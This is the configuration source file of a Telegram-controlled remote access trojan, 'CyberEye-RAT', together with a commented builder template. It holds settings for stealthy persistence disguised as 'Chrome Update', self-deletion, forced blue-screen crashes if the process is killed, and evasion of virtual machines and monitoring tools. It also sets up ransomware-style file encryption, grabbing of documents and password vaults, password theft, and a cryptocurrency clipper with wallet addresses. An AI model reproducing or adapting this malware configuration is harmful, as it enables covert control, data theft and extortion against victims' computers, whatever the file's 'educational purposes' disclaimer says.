/* 
       * Original Version

       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       * Modded Version

       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/


using System;

namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram settings.
        public const string TelegramToken = "TELEGRAM_TOKEN_HERE";
        public const string TelegramChatID = "TELEGRAM_CHAT_ID_HERE";
        public static int TelegramCommandCheckDelay = 1;
        // Installation to system.
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Users\CyberEye\rat.exe";
        // Add to startup.
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        // Protect process with BSoD (if killed).
        public static bool ProcessBSODProtectionEnabled = true;
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = true;
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
        public static bool PreventStartOnVirtualMachine = true;
        // Start delay (in seconds).
        public static int StartDelay = 0;
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = true;
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain"
        };
        // Types of files to be encrypted
        public static string[] EncryptionFileTypes =
        {
            ".lnk",
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        // Maximum file size to grab (in bytes).
        public static long GrabFileSize = 6291456;
        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        // Automatically steal all passwords and send to chat at first start.
        public static bool AutoStealerEnabled = false;
        // Clipper is enabled
        public static bool ClipperEnabled = true;
        // Your wallet addresses
        public static string bitcoin_address = "bc1q5exw2v9sa0yktp2t7xnq8ma2xpn5a29s7w283y";
        public static string etherium_address = "0x8d797249170d263B959A3c688D8456adBcfBC319";
        public static string monero_address = "0xF978FE35d00A201eB48aB3908993e14f312001a2";

        // * Modded *
        //Assembly
        public const string AssemblyTitle = "TelegramRAT Modded";
        public const string AssemblyDescription = "";
        public const string AssemblyConfiguration = "";
        public const string AssemblyCompany = "";
        public const string AssemblyProduct = "TelegramRAT Modded";
        public const string AssemblyCopyright = "Copyright © 2023";
        public const string AssemblyTrademark = "";
        public const string AssemblyCulture = "";
        public const string AssemblyVersion = "1.0.2";
        public const string AssemblyFileVersion = "1.0.2";

        /*
        // BUILDER

        // Telegram settings.
        public const string TelegramToken = "[TELEGRAMTOKEN]";
        public const string TelegramChatID = "[TELEGRAMCHATID]";
        public static int TelegramCommandCheckDelay = Convert.ToInt32("[TELEGRAMCOMMANDCHECKDELAY]");
        // Installation to system.
        public static bool AdminRightsRequired = Convert.ToBoolean("[AdminRightsRequired]");
        public static bool AttributeHiddenEnabled = Convert.ToBoolean("[AtrHidEnabled]");
        public static bool AttributeSystemEnabled = Convert.ToBoolean("[AtrSysEnabled]");
        public static bool MeltFileAfterStart = Convert.ToBoolean("[MeltFile]");
        public static string InstallPath = "[InstallPathBuild]";
        // Add to startup.
        public static bool AutorunEnabled = Convert.ToBoolean("[AUTORUNENABLED]");
        public static string AutorunName = "[AUTORUNNAME]";
        // Protect process with BSoD (if killed).
        public static bool ProcessBSODProtectionEnabled = Convert.ToBoolean("[BSODPROTECT]");
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = Convert.ToBoolean("[HideConsoleWindow]");
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
        public static bool PreventStartOnVirtualMachine = Convert.ToBoolean("[PreventVRMachineStart]");
        // Start delay (in seconds).
        public static int StartDelay = Convert.ToInt32("[STARTDELAYBUILD]");
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = Convert.ToBoolean("[BlockNetworkAct]");
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain"
        };
        // Types of files to be encrypted
        public static string[] EncryptionFileTypes =
        {
            ".lnk",
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        // Maximum file size to grab (in bytes).
        public static long GrabFileSize = Convert.ToInt64("[GrabFileSizeBuild]"); //6291456
        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        // Automatically steal all passwords and send to chat at first start.
        public static bool AutoStealerEnabled = Convert.ToBoolean("[AUTOSTEAL]");
        // Clipper is enabled
        public static bool ClipperEnabled = Convert.ToBoolean("[CLIPPERENABLED]");
        // Your wallet addresses
        public static string bitcoin_address = "[BITCOINADRESS]";
        public static string etherium_address = "[ETHERIUMADRESS]";
        public static string monero_address = "[MONEROADRESS]";

        // * Modded *
        //Assembly
        public const string AssemblyTitle = "[AssemblyTitleBuild]";
        public const string AssemblyDescription = "[AssemblyDescriptionBuild]";
        public const string AssemblyConfiguration = "[AssemblyConfigurationBuild]";
        public const string AssemblyCompany = "[AssemblyCompanyBuild]";
        public const string AssemblyProduct = "[AssemblyProductBuild]";
        public const string AssemblyCopyright = "[AssemblyCopyrightBuild]";
        public const string AssemblyTrademark = "[AssemblyTrademarkBuild]";
        public const string AssemblyCulture = "[AssemblyCultureBuild]";
        public const string AssemblyVersion = "1.0.2";
        public const string AssemblyFileVersion = "[AssemblyFileVersionBuild]";
        */
    }
}
